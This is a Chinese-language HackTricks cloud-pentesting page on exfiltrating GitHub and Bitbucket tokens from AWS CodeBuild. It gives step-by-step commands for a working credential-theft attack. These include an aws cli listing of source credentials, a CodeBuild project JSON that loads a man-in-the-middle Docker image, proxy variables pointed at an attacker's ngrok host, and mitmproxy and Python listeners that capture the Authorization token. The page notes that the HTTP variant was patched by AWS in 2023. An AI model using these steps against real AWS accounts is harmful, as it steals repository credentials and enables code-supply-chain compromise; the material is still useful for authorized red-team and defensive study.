# AWS Codebuild - 令牌泄露

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 恢复Github/Bitbucket配置的令牌

首先，检查是否配置了任何可能泄露的源凭据：
```bash
aws codebuild list-source-credentials
```
### 通过 Docker 镜像

如果发现例如 Github 的身份验证设置在账户中，您可以通过让 Codebuild 使用特定的 Docker 镜像来运行项目的构建来**外泄**该**访问**（GH 令牌或 OAuth 令牌）。

为此，您可以**创建一个新的 Codebuild 项目**或更改现有项目的**环境**以设置**Docker 镜像**。

您可以使用的 Docker 镜像是 [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)。这是一个非常基本的 Docker 镜像，将设置**环境变量 `https_proxy`**、**`http_proxy`** 和 **`SSL_CERT_FILE`**。这将允许您拦截大部分在**`https_proxy`**和**`http_proxy`**中指定的主机的流量，并信任**`SSL_CERT_FILE`**中指定的 SSL 证书。

1. **创建并上传您自己的 Docker MitM 镜像**
   * 按照存储库的说明设置代理 IP 地址并设置 SSL 证书，然后**构建 Docker 镜像**。
   * **不要设置 `http_proxy`** 以免拦截对元数据端点的请求。
   * 您可以使用像 `ngrok tcp 4444` 这样的**`ngrok`**来将代理设置为您的主机。
   * 构建完成 Docker 镜像后，**将其上传到公共存储库**（Dockerhub、ECR...）。
2. **设置环境**
   * 创建一个**新的 Codebuild 项目**或**修改**现有项目的环境。
   * 设置项目使用**先前生成的 Docker 镜像**。

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **在您的主机中设置 MitM 代理**

* 如**Github 存储库**中所示，您可以使用类似以下内容：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
使用的**mitmproxy版本为9.0.1**，据报道，使用版本10可能无法正常工作。
{% endhint %}

4. **运行构建并捕获凭据**

*   您可以在**Authorization**标头中看到令牌：

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

这也可以通过类似以下方式在aws cli中完成{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### 通过HTTP协议

{% hint style="success" %}
**这个漏洞在2023年2月20日那周某个时间点被AWS修复了（我想是在星期五）。所以攻击者无法再滥用它了 :)**
{% endhint %}

一个拥有**CodeBuild中提升权限的攻击者**可以泄露配置的Github/Bitbucket令牌，或者如果权限是通过OAuth配置的，可以泄露**用于访问代码的临时OAuth令牌**。

* 攻击者可以向CodeBuild项目添加环境变量**http\_proxy**和**https\_proxy**，指向他的机器（例如`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* 然后，将github仓库的URL更改为使用HTTP而不是HTTPS，例如：\*\*http://\*\*github.com/carlospolop-forks/TestActions
* 然后，在代理变量（http\_proxy和https\_proxy）指向的端口上运行来自[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)的基本示例。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最后，点击**构建项目**，**凭证**将以明文（base64编码）发送到mitm端口：

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
现在攻击者将能够从自己的机器上使用令牌，列出所有特权并比直接使用CodeBuild服务更容易地滥用。
{% endhint %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
